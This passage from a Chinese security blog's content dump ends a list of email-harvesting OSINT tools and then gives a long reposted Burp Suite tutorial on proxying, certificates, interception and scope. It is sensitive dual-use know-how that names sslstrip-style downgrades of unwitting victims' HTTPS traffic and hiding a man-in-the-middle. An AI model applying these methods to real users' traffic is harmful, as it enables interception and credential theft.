href=\"https://www.ctfile.com/\">https://www.ctfile.com</a></li>\n<li>夸克网盘：<a href=\"https://pan.quark.cn/\">https://pan.quark.cn</a></li>\n<li>新浪微盘</li>\n</ul>\n<h2 id=\"邮箱\"><a href=\"#邮箱\" class=\"headerlink\" title=\"邮箱\"></a>邮箱</h2><ul>\n<li>Hunter：<a href=\"https://hunter.io/\">https://hunter.io</a></li>\n<li>Snov.io：<a href=\"https://app.snov.io/\">https://app.snov.io</a></li>\n<li>Phonebook：also works on subdomains and urls <a href=\"https://phonebook.cz/\">https://phonebook.cz</a></li>\n<li>Skymem：<a href=\"https://www.skymem.info/\">https://www.skymem.info</a></li>\n<li>email-format：<a href=\"https://www.email-format.com/i/search/\">https://www.email-format.com/i/search/</a></li>\n<li>搜邮箱：<a href=\"https://souyouxiang.com/find-contact/\">https://souyouxiang.com/find-contact/</a></li>\n<li>theHarvester：also works on subdomains <a href=\"https://github.com/laramies/theHarvester\">https://github.com/laramies/theHarvester</a></li>\n</ul>\n<h3 id=\"Hunter\"><a href=\"#Hunter\" class=\"headerlink\" title=\"Hunter\"></a>Hunter</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124162353785.png\"></p>\n<h3 id=\"Snov-io\"><a href=\"#Snov-io\" class=\"headerlink\" title=\"Snov.io\"></a>Snov.io</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163506452.png\"></p>\n<h3 id=\"Phonebook\"><a href=\"#Phonebook\" class=\"headerlink\" title=\"Phonebook\"></a>Phonebook</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163603784.png\"></p>\n<h3 id=\"Skymem\"><a href=\"#Skymem\" class=\"headerlink\" title=\"Skymem\"></a>Skymem</h3><p><img src=\"/images%5C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5Cimage-20231124163743384.png\"></p>\n<h3 id=\"email-format\"><a href=\"#email-format\" class=\"headerlink\" title=\"email-format\"></a>email-format</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163836496.png\"></p>\n<h3 id=\"搜邮箱\"><a href=\"#搜邮箱\" class=\"headerlink\" title=\"搜邮箱\"></a>搜邮箱</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163031668.png\"></p>\n<h3 id=\"theHarvester\"><a href=\"#theHarvester\" class=\"headerlink\" title=\"theHarvester\"></a>theHarvester</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124164253796.png\"><br></style></p>\n"},{"title":"Burp Suite使用介绍（一）","cover":"https://img0.baidu.com/it/u=2259429094,2069555&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800","swiper_index":10,"top_group_index":10,"background":"#fff","date":"2025-03-20T15:02:02.000Z","updated":"2025-03-20T15:11:10.979Z","keywords":null,"description":null,"top":null,"top_img":null,"comments":1,"toc":null,"toc_number":null,"toc_style_simple":null,"copyright":null,"copyright_author":"转载","copyright_author_href":null,"copyright_url":null,"copyright_info":null,"mathjax":null,"katex":null,"aplayer":null,"highlight_shrink":null,"aside":null,"ai":null,"_content":"***\n\nBurp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。本文主要介绍它的以下特点：\n\n```\n1.Target(目标)——显示目标目录结构的的一个功能\n2.Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。\n3.Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。\n4.Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。\n5.Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。\n6.Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。\n7.Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。\n8.Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。\n9.Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。\n10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。\n11.Options(设置)——对Burp Suite的一些设置\n```\n\n<!--more-->\n\n## 测试工作流程\n\nBurp支持手动的Web应用程序测试的活动。它可以让你有效地结合手动和自动化技术，使您可以完全控制所有的BurpSuite执行的行动，并提供有关您所测试的应用程序的详细信息和分析。 让我们一起来看看Burp Suite的测试流程过程吧。 如下图\n\n![Image001](https://wooyun.js.org/images_result/images/2014101711120074380.png \"image001.png\")\n\n## 简要分析\n\n代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动，在一个典型的测试中，侦察和分析阶段包括以下任务：\n\n手动映射应用程序-使用浏览器通过BurpSuite代理工作，手动映射应用程序通过以下链接，提交表单，并通过多步骤的过程加强。这个过程将填充代理的历史和目标站点地图与所有请求的内容，通过被动蜘蛛将添加到站点地图，可以从应用程序的响应来推断任何进一步的内容(通过链接、表单等)。也可以请求任何未经请求的站点(在站点地图中以灰色显示的)，并使用浏览器请求这些。\n\n在必要是执行自动映射-您可以使用BurpSuite自动映射过程中的各种方法。可以进行自动蜘蛛爬行，要求在站点地图未经请求的站点。请务必在使用这个工具之前，检查所有的蜘蛛爬行设置。\n\n使用内容查找功能发现，可以让您浏览或蜘蛛爬行可见的内容链接以进一步的操作。\n\n使用BurpSuite Intruder(入侵者)通过共同文件和目录列表执行自定义的发现，循环，并确定命中。\n\n注意，在执行任何自动操作之前，可能有必要更新的BurpSuite的配置的各个方面，诸如目标的范围和会话处理。\n\n分析应用程序的攻击面 - 映射应用程序的过程中填入代理服务器的历史和目标站点地图与所有的BurpSuite已抓获有关应用程序的信息。这两个库中包含的功能来帮助您分析它们所包含的信息，并评估受攻击面的应用程序公开。此外，您可以使用BurpSuite的目标分析器报告的攻击面的程度和不同类型的应用程序使用的URL 。\n\n接下来主要介绍下BurpSuite的各个功能吧。先介绍Proxy功能，因为Proxy起到一个心脏功能，所有的应用都基于Proxy的代理功能。\n\n## Burp Suite功能按钮键翻译对照\n\n|                                |           |                                        |                 |\n| ------------------------------ | --------- | -------------------------------------- | --------------- |\n| ### 导航栏                        |           |                                        |                 |\n| Burp                           | BurpSuite | save state wizard                      | 保存状态向导          |\n| restore state                  | 恢复状态      | Remember setting                       | 记住设置            |\n| restore defaults               | 恢复默认      | Intruder                               | 入侵者             |\n| Start attack                   | 开始攻击(爆破)  | Actively scan defined insertion points | 定义主动扫描插入点       |\n| Repeater                       | 中继器       | New tab behavior                       | 新标签的行为          |\n| Automatic payload positions    | 自动负载位置    | config predefined payload lists        | 配置预定义的有效载荷清单    |\n| Update content-length          | 更新内容长度    | unpack gzip/deflate                    | 解压gzip/放弃       |\n| Follow redirections            | 跟随重定向     | process cookies in redirections        | 在重定向过程中的cookies |\n| View                           | 视图        | Action                                 | 行为              |\n| ### 功能项                        |           |                                        |                 |\n| Target                         | 目标        | Proxy                                  | 代理              |\n| Spider                         | 蜘蛛        | Scanner                                | 扫描              |\n| Intruder                       | 入侵者       | Repeater                               | 中继器             |\n| Sequencer                      | 定序器       | Decoder                                | 解码器             |\n| Comparer                       | 比较器       | Extender                               | 扩展              |\n| Options                        | 设置        | Detach                                 | 分离              |\n| Filter                         | 过滤器       | SiteMap                                | 网站地图            |\n| Scope                          | 范围        | Filter by request type                 | 通过请求过滤          |\n| Intercept                      | 拦截        | response Modification                  | 响应修改            |\n| match and replace              | 匹配和替换     | ssl pass through                       | SSL通过           |\n| Miscellaneous                  | 杂项        | spider status                          | 蜘蛛状态            |\n| crawler settings               | 履带式设置     | passive spidering                      | 被动蜘蛛            |\n| form submission                | 表单提交      | application login                      | 应用程序登录          |\n| spider engine                  | 蜘蛛引擎      | scan queue                             | 扫描队列            |\n| live scanning                  | 现场扫描      | live active scanning                   | 现场主动扫描          |\n| live passive scanning          | 现场被动扫描    | attack insertion points                | 攻击插入点           |\n| active scanning optimization   | 主动扫描优化    | active scanning areas                  | 主动扫描区域          |\n| passive scanning areas         | 被动扫描区域    | Payload                                | 有效载荷            |\n| payload processing             | 有效载荷处理    | select live capture request            | 选择现场捕获请求        |\n| token location within response | 内响应令牌的位置  | live capture options                   | 实时捕捉选项          |\n| Manual load                    | 手动加载      | Analyze now                            | 现在分析            |\n| Platform authentication        | 平台认证      | Upstream proxy servers                 | 上游代理服务器         |\n| Grep Extrack                   | 提取        |                                        |                 |\n\n# Proxy功能\n\n***\n\nBurp Proxy相当于BurpSuite的心脏，通过拦截，查看和修改所有的请求和响应您的浏览器与目标Web服务器之间传递。 下面了解有关BurpProxy：\n\n![Image003](https://wooyun.js.org/images_result/images/2014101711120067021.png \"image003.png\")\n\n## Using BurpProxy http、https\n\n### http\n\n设置代理的方法：以http ie为例：\n\n```\n工具>>Internet选项>>连接>>局域网>>勾选代理服务器填写地址127.0.0.1端口8080\n```\n\n这里端口可以随便定义但是要跟burp的监听端口要一致然后保存再到Proxy的Options中添加add\n\n![Image005](https://wooyun.js.org/images_result/images/2014101711120062713.jpg \"image005.jpg\")\n\n![Image007](https://wooyun.js.org/images_result/images/2014101711120053086.jpg \"image007.jpg\")\n\n这样http协议的监听就可以了,当intercept is on表示开启拦截功能，反之\n\n![Image009](https://wooyun.js.org/images_result/images/2014101711120574272.jpg \"image009.jpg\")\n\n这样就代表拦截成功，我们可以右击send to Repeater去修改数据再发送，也可以右击改变提交请求方式(change request method)比如get或者post等功能\n\n### https\n\n```\n1.以管理员权限运行ie浏览器\n2.像http那样配置好代理 \n3.在地址栏访问https地址，单击继续 \n4.点击错误证书在这个地址栏 \n5.点击查看证书 \n6.在证书路径选项卡点击PortSwigger CA,然后再点击查看证书 \n7.在常规选项卡里点击安装证书 \n8.在证书导入向导中，选择“将所有的证书放入下列存储区” \n9.点击浏览 \n10.以当前用户或者本机计算机都可以 \n11.点击ok完成导入 \n12.重启ie（不需要以管理员权限运行） 其它浏览器差不多具体请查看官网 \n```\n\n<http://portswigger.net/burp/Help/proxy_options_installingCAcert.html>\n\n### Intercept\n\n用于显示和修改HTTP请求和响应，通过你的浏览器和Web服务器之间。在BurpProxy的选项中，您可以配置拦截规则来确定请求是什么和响应被拦截(例如，范围内的项目，与特定文件扩展名，项目要求与参数，等)。 该面板还包含以下控制：\n\n#### Forward\n\n当你编辑信息之后，发送信息到服务器或浏览器\n\n#### Drop\n\n当你不想要发送这次信息可以点击drop放弃这个拦截信息\n\n#### Interception is on/off\n\n这个按钮用来切换和关闭所有拦截。如果按钮显示Interception is On，表示请求和响应将被拦截或自动转发根据配置的拦截规则配置代理选项。如果按钮显示Interception is off则显示拦截之后的所有信息将自动转发。\n\n#### Action\n\n说明一个菜单可用的动作行为操作可以有哪些操作功能。\n\n#### Comment field\n\n为请求或响应添加注释，以便更容易在History选项卡中识别它们。\n\n![Image011](https://wooyun.js.org/images_result/images/2014101711120578170.png \"image011.png\")\n\n#### Highlight\n\n为请求或响应添加颜色，可以在history选项卡和截获中更容易发现。\n\n![Image013](https://wooyun.js.org/images_result/images/2014101711120669655.png \"image013.png\")\n\n#### History\n\n代理历史认为每个请求和响应。通过代理可以记录全部请求和响应。您可以过滤和注释这个信息来帮助管理它，并使用代理的历史来测试流程。History(代理历史)总在更新，即使你把Interception turned off(拦截关闭)，允许浏览不中断的同时还监测应用流量的关键细节。\n\n#### History Table\n\n表中显示已通过代理HTTP消息的所有请求，并且可以查看完整的你所做的任何修改和截获的信息的请求和响应。 表中包含以下字段：\n\n`# (请求索引号)、Host(主机)、Method(请求方式)、URL(请求地址)、Params(参数)、Edited(编辑)、Status(状态)、Length(响应字节长度)、MIME type(响应的MLME类型)、Extension(地址文件扩展名)、Title(页面标题)、Comment(注释)、SSL、IP(目标IP地址)、Cookies、Time(发出请求时间)、Listener port(监听端口)`。\n\n![Image015](https://wooyun.js.org/images_result/images/2014101711120687800.png \"image015.png\")\n\n您可以通过单击任何列标题进行升序或降序排列。如果您在表中双击选择一个项目地址，会显示出一个详细的请求和响应的窗口。或者右击选择 `Show new history window`\n\n![Image017](https://wooyun.js.org/images_result/images/2014101711120625578.png \"image017.png\")\n\n### Display Filter\n\nProxy histroy有一个可以用来在视图中隐藏某些内容的功能，以使其更易于分析和你感兴趣的工作内容的显示过滤。 History Table上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：\n\n![Image019](https://wooyun.js.org/images_result/images/2014101711120694811.png \"image019.png\")\n\n#### Request type\n\nShow only in-scope items--勾选则显示在范围内的项目，反之。\n\n#### MIME type\n\n您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。\n\n#### Status code\n\n您可以设定是否要显示或隐藏各种HTTP状态码响应。\n\n#### Search term\n\n您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“Negative search (消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。\n\n#### File extension\n\n您可以设定是否要显示或隐藏指定的文件扩展名的项目。\n\n#### Annotation\n\n您可以设定是否显示使用用户提供的评论或仅亮点项目。\n\n#### Listener\n\n你可以只显示特定的监听端口上接收的项目。测试访问控制时可能有用。 如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究了大量代理的历史来理解各种不同的请求显示。\n\n### Annotations\n\n您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。 两种方式添加亮点： 1)使用在最左边的表列中的下拉菜单中突出显示单个项目。 2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。 两种方法添加注释： 1)双击相关条目，注释列中，添加或编辑就地评论。 2)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。 除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。\n\n### Options\n\n设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等。\n\n### Proxy Listeners\n\n代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听12.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。\n\n![Image021](https://wooyun.js.org/images_result/images/2014101711120626419.png \"image021.png\")\n\n#### 1)Binding\n\n这些设置控制Burp怎么代理监听器绑定到本地网络接口：\n\n```\nBind to port---这是将被打开侦听传入连接的本地接口上的端口。你将需要使用一个没有被绑定被其他应用程序的闲置端口。\nBind to address---这是Burp绑定到本地接口的IP地址。\n```\n\n您可以绑定到刚刚127.0.0.1接口或所有接口，或任何特定的本地IP地址。\n\n注意：如果监听器绑定到所有接口或特定的非loopback接口，那么其他计算机可能无法连接到该侦听器。这可能使他们发起出站连接，从您的IP地址发起，并以访问代理服务器历史的内容，其中可能包含敏感数据，如登录凭据。你应该只启用此当你位于一个受信任的网络上。\n\nBurpSuite让您创建多个代理服务器的侦听器，并提供了丰富的控制自己的行为的配置选项。你可能偶尔需要进行测试时不寻常的应用，或与一些非基于浏览器的HTTP客户端进行合作，利用这些选项。\n\n#### 2)Request Handling\n\n这些设置包括选项来控制是否BurpSuite重定向通过此侦听器接收到的请求：\n\n**Redirect to host** - 如果配置了这个选项，Burp会在每次请求转发到指定的主机，而不必受限于浏览器所请求的目标。需要注意的是，如果你正使用该选项，则可能需要配置匹配/替换规则重写的主机头中的请求，如果服务器中，您重定向请求预期，不同于由浏览器发送一个主机头。\n\n**Redirect to port** - 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览器所请求的目标。\n\n**Force use of SSL** - 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。\n\n注意：每一个重定向选项都可以单独使用。因此，例如，可以将所有请求重定向到一个特定的主机，同时保留原来的端口和协议在每个原始请求中使用。隐形BurpProxy的支持允许非代理感知客户端直接连接到监听。\n\n#### 3)Certificate\n\n这些设置控制呈现给客户端的SSL服务器的SSL证书。使用这些选项可以解决一些使用拦截代理时出现的SSL问题：\n\n```\n你可以消除您的浏览器的SSL警报，并需要建立SSL例外。 \n凡网页加载来自其他域的SSL保护的项目，您可以确保这些均可由浏览器加载，而不需要先手动接受每个引用的域代理的SSL证书。 \n您可以与拒绝连接到服务器，如果接收到无效的SSL证书胖客户端应用程序的工作。 \n```\n\n下列选项可用：\n\n**Use a self-signed certificate**---||-一个简单的自签名SSL证书提交给您的浏览器，它总是导致SSL警告。\n\n**Generate CA-signed per-host certificate**---||-这是默认选项。安装后，BurpSuite创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用，每次BurpSuite运行。当你的浏览器发出SSL连接到指定的主机，Burp产生该主机，通过CA证书签名的SSL证书。您可以安装BurpSuite的CA证书作为在浏览器中受信任的根，从而使每个主机的证书被接受，没有任何警报。您还可以导出其他工具或Burp的其他实例使用CA证书。\n\n**Generate a CA-signed certificate with a specific hostname**---||这类似于前面的选项;然而，Burp会产生一个单一的主机证书与每一个SSL连接使用，使用您指定的主机名。在进行无形的代理时，此选项有时是必要的，因为客户端没有发送连接请求，因此Burp不能确定SSL协议所需的主机名。你也可以安装BurpSuite的CA证书作为受信任的根。\n\n**Use a custom certificate**---||-此选项使您可以加载一个特定的证书（在PKCS＃12格式）呈现给你的浏览器。如果应用程序使用它需要特定的服务器证书（例如一个给定序列号或证书链）的客户端应该使用这个选项。\n\n#### 4)Exporting and Importing the CA Certificate\n\n您可以导出您安装特定的CA证书在其他工具或BurpSuite的其他情况下使用，并且可以导入证书Burp在当前实例使用。 您可以选择要导出的证书只（用于导入到您的浏览器或其他设备的信任），或者你可以同时导出的证书及其私钥。\n\n注意：您不应该透露的私钥证书给任何不可信的一方。拥有你的证书和密钥的恶意攻击者可能可以，即使你不使用Burp拦截浏览器的HTTPS流量。\n\n您也可以仅通过访问http\\://burp/cert在浏览器中导出证书。它使HTTPS请求您的浏览器相同的证书，但在一些移动设备上安装时，设备通过一个URL来下载它是有帮助的。\n\n### Interception Options\n\n设置控制哪些请求和响应都停滞用于查看和编辑在拦截选项卡。单独的设置将应用到请求和响应。\n\n在“Intercept”复选框确定是否有讯息拦截。如果它被选中，然后Burp应用配置的规则对每个消息，以确定它是否应该被拦截。\n\n个别规则可以激活或停用对每个规则的左边的复选框。规则可以被添加，编辑，删除，或使用按钮重新排序。规则可以在消息，包括域名， IP地址，协议， HTTP方法， URL，文件扩展名，参数，cookie ，头/主体内容，状态代码，MIME类型， HTML页面标题和代理的几乎任何属性进行配置侦听端口。您可以配置规则来只拦截项目的网址是目标范围之内的。可以使用正则表达式对定义复杂的匹配条件。\n\n规则按顺序处理，并且使用布尔运算符AND和OR组合。这些都与处理简单的“从左到右”的逻辑，其中每个算子的范围，如下所示：（所有规则之前累积的结果）和/或（当前规则的结果）所有活动的规则在每封邮件进行处理，并最终活动规则应用后的结果确定消息是否被拦截或转发的背景。“自动更新内容长度”复选框控件时，这已被用户修改是否Burp自动更新消息的Content-Length头。使用这个选项通常是必不可少的，当HTTP主体已被修改。\n\n如果有需求，可以在请求结束时自动修复丢失或多余的新行。如果编辑请求不包含标题下面一个空行，Burp会添加此。如果与含有URL编码参数的身体的编辑请求包含任何换行符在身体的末端，Burp就会删除这些。这个选项可以是有用的纠正，而手动编辑在拦截视图的要求，以避免发出无效的请求向服务器发出的错误。\n\n### Response Modification\n\n设置用于执行自动响应的修改。您可以使用这些选项通过自动重写应用程序响应的HTML来完成各种任务。 下列选项在数据删除客户端控件可能是有用的：\n\n```\n显示隐藏的表单字段。 （有一个子选项，以突出强调取消隐藏栏在屏幕上，便于识别。 ）\n启用已禁用的表单域\n删除输入字段长度限制\n删除的JavaScript表单验证\n```\n\n下列选项可用于禁止客户端逻辑用于测试目的（注意，这些特征并非设计用来作为NoScript的的方式进行安全防御）有用：\n\n```\n删除所有的JavaScript。\n删除<object>标记。\n```\n\n下列选项可用于提供对受害用户的流量在不知不觉中被通过BurpSuite代理sslstrip般的攻击。您可以在与听者选项强制SSL的传出请求，以有效地从用户的连接剥离SSL一起使用这些：\n\n```\n转换HTTPS为HTTP的链接。\n删除cookie安全标志。\n```\n\n### Match and Replace\n\n用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，以及任何适用的替代品制成。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则 - 这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域。\n\n在替换字符串，组可以使用其次为索引$引用。所以下面的替换字符串将包含被匹配在上述正则表达式，该标记的名称：\n\n![Image023](https://wooyun.js.org/images_result/images/2014101711120634416.png \"image023.png\")\n\n### SSL Pass Through\n\n用于指定目标Web服务器为其Burp会直接通过SSL连接。关于通过这些连接的请求或响应任何细节将在代理拦截视图或历史。\n\n通过SSL连接传递可以在这情况下是不能直接消除了客户端的SSL错误是非常有用 - 例如，在执行SSL证书钉扎的移动应用程序。如果应用程序访问多个域，或使用HTTP和HTTPS连接的混合，然后通过SSL连接到特定问题的主机仍然可以让您以正常方式使用Burp其他交通工作。\n\n如果启用该选项来自动添加客户端SSL协商失败的项目，然后BurpSuite会在客户端失败的SSL协议检测（例如，由于不承认BurpSuite的CA证书），并会自动将相关的服务器添加到SSL通通过列表。\n\n### Miscellaneous\n\n控制Burp代理的行为的一些具体细节。下列选项可用：\n\n**Use HTTP/1.0 in requests to server** - 该选项控制BurpSuite代理是否强制在请求目标服务器的HTTP 1.0版。默认设置是使用任何的HTTP版本所使用的浏览器。然而，一些遗留服务器或应用程序可能需要1.0版本才能正常工作。\n\n**Use HTTP/1.0 in responses to client** - 目前所有的浏览器都支持这两个版本1.0和HTTP 1.1 。从1.0版本开始已经减少了一些功能，迫使使用1.0版本有时会很有用，以控制浏览器的行为的各个方面，例如防止企图执行HTTP流水线。\n\n**Set response header “Connection:close”** - 这个选项也可能是有用的，以防止HTTP流水线在某些情况下。\n\n**Unpack gzip / deflate in requests** - 某些应用程序（通常是那些使用自定义客户端组件） ，压缩在请求消息体。该选项控制BurpProxy是否自动解压缩压缩请求主体。请注意，某些应用程序可能被破坏，如果他们期望的压缩体和压缩已通过Burp被删除。\n\n**Unpack gzip / deflate in responses** - 大多数浏览器接受的gzip和响应紧缩压缩的内容。该选项控制BurpSuite代理是否自动解压缩压缩响应机构。请注意，您可以经常防止服务器试图通过删除请求（可能使用BurpProxy的匹配和替换功能）的Accept-Encoding头压缩的响应。 Disable web interface at http\\://burp - 如果你不得不配置你的听众接受无保护的接口上的连接，并希望阻止他人接触到Burp浏览器控件，此选项可能有用。\n\n**Suppress Burp error messages** - 当某些错误时，默认情况下BurpSuite返回有意义的错误信息到浏览器。如果你想在隐身模式下运行Burp，履行人在这方面的中间人攻击的受害者用户，那么它可能是有用的抑制这些错误信息来掩盖一个事实，即Burp是参与。\n\n**Disable logging to history and site map** - 此选项可以防止Burp从记录任何请求到代理服务器的历史或目标站点地图。如果您使用的是Burp代理对于一些特定用途，如身份验证到上游服务器或进行匹配和替换操作，并且要避免产生内存和存储开销采伐牵扯它可能是有用的。\n\n**Enable interception at startup**- 此选项可让您设定是否在Burp时启动代理截获应该启用。您可以选择始终启用拦截，始终禁用拦截，或者从Burp上次关闭恢复设置。\n\n## Target功能\n\n目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程。\n\n### Using Burp Target\n\n在地址栏输入www\\.baidu.com，如图\n\n![Image025](https://wooyun.js.org/images_result/images/2014101711120617724.jpg \"image025.jpg\")\n\n这样看起来site map是不是很乱，则可以右击add to scope，然后点击Filter勾选Show only in-scope items，此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤\n\n![Image027](../images_result/images/2014101711120751588.jpg \"image027.jpg\")\n\n针对地址右击显示当前可以做的一些动作操作等功能。左图 针对文件右击显示当前可以做一些动作操作等功能。右图\n\n![Image029](https://wooyun.js.org/images_result/images/2014101711120751588.jpg \"image029.jpg\") ![Image031](https://wooyun.js.org/images_result/images/2014071402582281360.jpg \"image031.jpg\")\n\n### 2)Scope\n\n这个主要是配合Site map做一些过滤的功能，如图：\n\n![Image033](https://wooyun.js.org/images_result/images/2014101711120768777.png \"image033.png\")\n\nInclude in scope就是扫描地址或者拦截历史记录里右击有个add to scope就是添加到这了，也可以自己手动添加。\n\nTarget分为site map和scope两个选项卡\n\n#### SiteMap\n\n中心Site Map汇总所有的信息Burp已经收集到的有关地址。你可以过滤并标注此信息，以帮助管理它，也可以使用SiteMap来手动测试工作流程。\n\n#### Target Information\n\nSiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请求的URL 。您还可以扩大有趣的分支才能看到进一步的细节。如果您选择树的一个或多个部分，在所有子分支所选择的项目和项目都显示在表视图。\n\n该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 。如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求/响应窗格。这包含了请求和响应的HTTP报文的编辑器，提供每封邮件的详细分析。\n\n站点地图汇总所有的信息BurpSuite已经收集到的有关申请。这包括：\n\n```\n所有这一切都通过代理服务器直接请求的资源。\n已推断出通过分析响应代理请求的任何物品（前提是你没有禁用被动Spider） 。\n内容使用Spider或内容发现功能查找。\n由用户手动添加的任何项目，从其它工具的输出。\n```\n\n已请求在SiteMap中的项目会显示为黑色。尚未被请求的项目显示为灰色。默认情况下（与被动蜘蛛(passviely scan this host)启用） ，当你开始浏览一个典型的应用，大量的内容将显示为灰色之前，你甚至得到尽可能要求，因为BurpSuite发现在您所请求的内容链接到它。您可以删除不感兴趣的地址\n\n![Image035](https://wooyun.js.org/images_result/images/2014101711120832954.png \"image035.png\")\n\n#### Display Filter\n\nSitemap可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容的显示过滤器 Sitemap上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：\n\nRequest type 你可以只显示在范围内的项目，只能与反应项目，或者带参数的请求。 MIME type 您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。 Status code 您可以设定是否要显示或隐藏各种HTTP状态码响应。 Search term 您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“消极搜索”选项，然后不匹配的搜索词唯一的项目将被显示。 File extension 您可以设定是否要显示或隐藏指定的文件扩展名的项目。 Annotation 您可以设定是否显示使用用户提供的评论或仅亮点项目。\n\n#### Annotations\n\n通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。\n\n您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。\n\n两种方式添加亮点：\n\n```\n1)使用在最左边的表列中的下拉菜单中突出显示单个项目。\n2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。\n两种方法添加注释：\n3)双击相关条目，注释列中，添加或编辑就地评论。\n4)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。\n```\n\n除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。\n\n#### Scope\n\nTarget scope设置，可以从SiteMap中添加也可以手动添加扫描范围到Scope。你可以在Target SiteMap和Proxy 